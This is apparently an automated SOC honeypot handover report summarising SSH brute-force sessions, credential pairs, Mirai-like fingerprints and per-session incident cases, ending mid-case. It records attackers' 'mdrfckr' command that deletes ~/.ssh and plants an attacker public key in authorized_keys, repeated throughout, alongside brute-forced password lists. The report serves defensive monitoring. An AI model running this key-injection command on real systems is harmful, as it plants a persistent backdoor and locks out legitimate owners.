# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-23 |
| **Generated At** | 2026-05-23T19:16:49Z |
| **Shift Time** | 19:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **477** |
| Confirmed Threats | **468** |
| False Positives Filtered | **9** (1.9%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **13** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **413** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **124** |
| Unique Credential Pairs | **59** |
| Unique Usernames | **27** |
| Unique Passwords | **57** |
| Successful Auth Pairs | **39** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 64 |
| `345gs5662d34` | 32 |
| `user` | 2 |
| `test` | 2 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 32 |
| `3245gs5662d34` | 32 |
| `testing` | 2 |
| `2glehe5t24th1issZs` | 2 |
| `0okmNJI(` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 32 |
| `root` | `3245gs5662d34` | 32 |
| `test` | `testing` | 2 |
| `root` | `2glehe5t24th1issZs` | 2 |
| `root` | `0okmNJI(` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123abc!@#` | `101.36.111.119` | 2026-05-23T17:10:43 |
| `root` | `3245gs5662d34` | `101.36.111.119` | 2026-05-23T17:10:46 |
| `root` | `QWEqwe123.` | `101.36.111.119` | 2026-05-23T17:21:47 |
| `root` | `Cisco@123` | `101.36.111.119` | 2026-05-23T17:29:22 |
| `root` | `p@ssw0rd` | `101.36.111.119` | 2026-05-23T17:33:10 |
| `root` | `test1337` | `79.143.188.82` | 2026-05-23T17:35:21 |
| `root` | `3245gs5662d34` | `79.143.188.82` | 2026-05-23T17:35:25 |
| `root` | `123456Dd` | `101.36.111.119` | 2026-05-23T17:36:52 |
| `root` | `....` | `101.36.111.119` | 2026-05-23T17:40:39 |
| `root` | `1236547890` | `197.44.15.210` | 2026-05-23T17:42:19 |
| `root` | `3245gs5662d34` | `197.44.15.210` | 2026-05-23T17:42:24 |
| `root` | `!@#123qwe` | `197.44.15.210` | 2026-05-23T17:46:21 |
| `root` | `v` | `197.44.15.210` | 2026-05-23T17:50:19 |
| `root` | `123qwe..` | `197.44.15.210` | 2026-05-23T17:58:27 |
| `root` | `2glehe5t24th1issZs` | `180.93.3.33` | 2026-05-23T18:02:22 |
| `root` | `3245gs5662d34` | `180.93.3.33` | 2026-05-23T18:02:25 |
| `root` | `@1234qwer` | `34.71.30.159` | 2026-05-23T18:02:30 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-05-23T18:02:36 |
| `root` | `!Q@W#E4r5t6y` | `34.71.30.159` | 2026-05-23T18:06:36 |
| `root` | `2glehe5t24th1issZs` | `103.118.82.254` | 2026-05-23T18:07:38 |
| `root` | `3245gs5662d34` | `103.118.82.254` | 2026-05-23T18:07:41 |
| `root` | `aditya123` | `197.44.15.210` | 2026-05-23T18:10:23 |
| `root` | `0okmNJI(` | `34.71.30.159` | 2026-05-23T18:10:27 |
| `root` | `q1w2Q!W@` | `103.118.82.254` | 2026-05-23T18:11:37 |
| `root` | `A123a123` | `197.44.15.210` | 2026-05-23T18:14:26 |
| `root` | `Passwort123` | `103.118.82.254` | 2026-05-23T18:15:35 |
| `root` | `L@y3rh0st2024` | `197.44.15.210` | 2026-05-23T18:18:32 |
| `root` | `Ww112233` | `103.118.82.254` | 2026-05-23T18:19:37 |
| `root` | `Qwe@123456` | `34.71.30.159` | 2026-05-23T18:22:30 |
| `root` | `Qqqq1111` | `197.44.15.210` | 2026-05-23T18:22:36 |
| `root` | `Aa654321` | `197.44.15.210` | 2026-05-23T18:26:43 |
| `root` | `Qq112233..` | `197.44.15.210` | 2026-05-23T18:30:48 |
| `root` | `q1w2E#R$` | `34.71.30.159` | 2026-05-23T18:34:18 |
| `root` | `Test@2020` | `103.118.82.254` | 2026-05-23T18:34:50 |
| `root` | `123456aA@` | `34.71.30.159` | 2026-05-23T18:38:29 |
| `root` | `Qwer123456!` | `34.71.30.159` | 2026-05-23T18:42:31 |
| `root` | `123123@Aa` | `103.118.82.254` | 2026-05-23T18:58:07 |
| `root` | `0okmNJI(` | `177.87.110.141` | 2026-05-23T19:12:46 |
| `root` | `3245gs5662d34` | `177.87.110.141` | 2026-05-23T19:12:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **477** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 124 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 124 | 8 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 124 | 8 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 32 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.71.30.159`, `79.143.188.82`, `197.44.15.210`, `101.36.111.119`, `180.93.3.33`, `103.118.82.254`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **17** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS61461` | Airtek Solutions C.A. | 2 | HIGH |
| `AS8452` | TE-AS | 1 | HIGH |
| `AS35179` | Korbank S. A. | 1 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | LOW |
| `AS7602` | Sai gon Postel Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-81bf40b0be1d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:10 |
| **Last Seen** | 2026-05-23 17:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:10:42` | `cowrie.session.connect` |
| `2026-05-23 17:10:42` | `cowrie.client.version` |
| `2026-05-23 17:10:43` | `cowrie.client.kex` |
| `2026-05-23 17:10:43` | `cowrie.login.success` |
| `2026-05-23 17:10:43` | `cowrie.session.params` |
| `2026-05-23 17:10:43` | `cowrie.command.input` |
| `2026-05-23 17:10:43` | `cowrie.command.failed` |
| `2026-05-23 17:10:43` | `cowrie.log.closed` |
| `2026-05-23 17:10:44` | `cowrie.session.params` |
| `2026-05-23 17:10:44` | `cowrie.command.input` |
| `2026-05-23 17:10:44` | `cowrie.session.file_download` |
| `2026-05-23 17:10:44` | `cowrie.log.closed` |
| `2026-05-23 17:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e277aba40ea

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:10 |
| **Last Seen** | 2026-05-23 17:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:10:46` | `cowrie.session.connect` |
| `2026-05-23 17:10:46` | `cowrie.client.version` |
| `2026-05-23 17:10:46` | `cowrie.client.kex` |
| `2026-05-23 17:10:46` | `cowrie.login.success` |
| `2026-05-23 17:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-460e4947ae2a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:21 |
| **Last Seen** | 2026-05-23 17:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:21:46` | `cowrie.session.connect` |
| `2026-05-23 17:21:46` | `cowrie.client.version` |
| `2026-05-23 17:21:47` | `cowrie.client.kex` |
| `2026-05-23 17:21:47` | `cowrie.login.success` |
| `2026-05-23 17:21:47` | `cowrie.session.params` |
| `2026-05-23 17:21:47` | `cowrie.command.input` |
| `2026-05-23 17:21:47` | `cowrie.command.failed` |
| `2026-05-23 17:21:47` | `cowrie.log.closed` |
| `2026-05-23 17:21:48` | `cowrie.session.params` |
| `2026-05-23 17:21:48` | `cowrie.command.input` |
| `2026-05-23 17:21:48` | `cowrie.session.file_download` |
| `2026-05-23 17:21:48` | `cowrie.log.closed` |
| `2026-05-23 17:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3839d25e1ece

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:21 |
| **Last Seen** | 2026-05-23 17:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:21:49` | `cowrie.session.connect` |
| `2026-05-23 17:21:49` | `cowrie.client.version` |
| `2026-05-23 17:21:50` | `cowrie.client.kex` |
| `2026-05-23 17:21:50` | `cowrie.login.success` |
| `2026-05-23 17:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82fc03beebbf

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:29 |
| **Last Seen** | 2026-05-23 17:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:29:22` | `cowrie.session.connect` |
| `2026-05-23 17:29:22` | `cowrie.client.version` |
| `2026-05-23 17:29:22` | `cowrie.client.kex` |
| `2026-05-23 17:29:22` | `cowrie.login.success` |
| `2026-05-23 17:29:22` | `cowrie.session.params` |
| `2026-05-23 17:29:22` | `cowrie.command.input` |
| `2026-05-23 17:29:22` | `cowrie.command.failed` |
| `2026-05-23 17:29:23` | `cowrie.log.closed` |
| `2026-05-23 17:29:23` | `cowrie.session.params` |
| `2026-05-23 17:29:23` | `cowrie.command.input` |
| `2026-05-23 17:29:23` | `cowrie.session.file_download` |
| `2026-05-23 17:29:23` | `cowrie.log.closed` |
| `2026-05-23 17:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8128b4e72a3b

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:29 |
| **Last Seen** | 2026-05-23 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:29:25` | `cowrie.session.connect` |
| `2026-05-23 17:29:25` | `cowrie.client.version` |
| `2026-05-23 17:29:25` | `cowrie.client.kex` |
| `2026-05-23 17:29:25` | `cowrie.login.success` |
| `2026-05-23 17:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c15249c2cc4

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:33 |
| **Last Seen** | 2026-05-23 17:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:33:10` | `cowrie.session.connect` |
| `2026-05-23 17:33:10` | `cowrie.client.version` |
| `2026-05-23 17:33:10` | `cowrie.client.kex` |
| `2026-05-23 17:33:10` | `cowrie.login.success` |
| `2026-05-23 17:33:11` | `cowrie.session.params` |
| `2026-05-23 17:33:11` | `cowrie.command.input` |
| `2026-05-23 17:33:11` | `cowrie.command.failed` |
| `2026-05-23 17:33:11` | `cowrie.log.closed` |
| `2026-05-23 17:33:11` | `cowrie.session.params` |
| `2026-05-23 17:33:11` | `cowrie.command.input` |
| `2026-05-23 17:33:11` | `cowrie.session.file_download` |
| `2026-05-23 17:33:11` | `cowrie.log.closed` |
| `2026-05-23 17:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6b5de6534c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:33 |
| **Last Seen** | 2026-05-23 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:33:13` | `cowrie.session.connect` |
| `2026-05-23 17:33:13` | `cowrie.client.version` |
| `2026-05-23 17:33:13` | `cowrie.client.kex` |
| `2026-05-23 17:33:14` | `cowrie.login.success` |
| `2026-05-23 17:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a89bb112b4

| Field | Detail |
|---|---|
| **Source IP** | `79.143.188[.]82` |
| **First Seen** | 2026-05-23 17:35 |
| **Last Seen** | 2026-05-23 17:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:35:21` | `cowrie.session.connect` |
| `2026-05-23 17:35:21` | `cowrie.client.version` |
| `2026-05-23 17:35:21` | `cowrie.client.kex` |
| `2026-05-23 17:35:21` | `cowrie.login.success` |
| `2026-05-23 17:35:22` | `cowrie.session.params` |
| `2026-05-23 17:35:22` | `cowrie.command.input` |
| `2026-05-23 17:35:22` | `cowrie.command.failed` |
| `2026-05-23 17:35:22` | `cowrie.log.closed` |
| `2026-05-23 17:35:22` | `cowrie.session.params` |
| `2026-05-23 17:35:22` | `cowrie.command.input` |
| `2026-05-23 17:35:22` | `cowrie.session.file_download` |
| `2026-05-23 17:35:22` | `cowrie.log.closed` |
| `2026-05-23 17:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.143.188[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.143.188[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac7901eead2

| Field | Detail |
|---|---|
| **Source IP** | `79.143.188[.]82` |
| **First Seen** | 2026-05-23 17:35 |
| **Last Seen** | 2026-05-23 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:35:24` | `cowrie.session.connect` |
| `2026-05-23 17:35:24` | `cowrie.client.version` |
| `2026-05-23 17:35:24` | `cowrie.client.kex` |
| `2026-05-23 17:35:25` | `cowrie.login.success` |
| `2026-05-23 17:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.143.188[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.143.188[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc2a107bdac2

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:36 |
| **Last Seen** | 2026-05-23 17:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:36:51` | `cowrie.session.connect` |
| `2026-05-23 17:36:51` | `cowrie.client.version` |
| `2026-05-23 17:36:51` | `cowrie.client.kex` |
| `2026-05-23 17:36:52` | `cowrie.login.success` |
| `2026-05-23 17:36:52` | `cowrie.session.params` |
| `2026-05-23 17:36:52` | `cowrie.command.input` |
| `2026-05-23 17:36:52` | `cowrie.command.failed` |
| `2026-05-23 17:36:52` | `cowrie.log.closed` |
| `2026-05-23 17:36:53` | `cowrie.session.params` |
| `2026-05-23 17:36:53` | `cowrie.command.input` |
| `2026-05-23 17:36:53` | `cowrie.session.file_download` |
| `2026-05-23 17:36:53` | `cowrie.log.closed` |
| `2026-05-23 17:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0c209bad36

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:36 |
| **Last Seen** | 2026-05-23 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 17:36:54` | `cowrie.session.connect` |
| `2026-05-23 17:36:54` | `cowrie.client.version` |
| `2026-05-23 17:36:55` | `cowrie.client.kex` |
| `2026-05-23 17:36:55` | `cowrie.login.success` |
| `2026-05-23 17:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e819c05bb1b8

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 17:40 |
| **Last Seen** | 2026-05-23 17:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
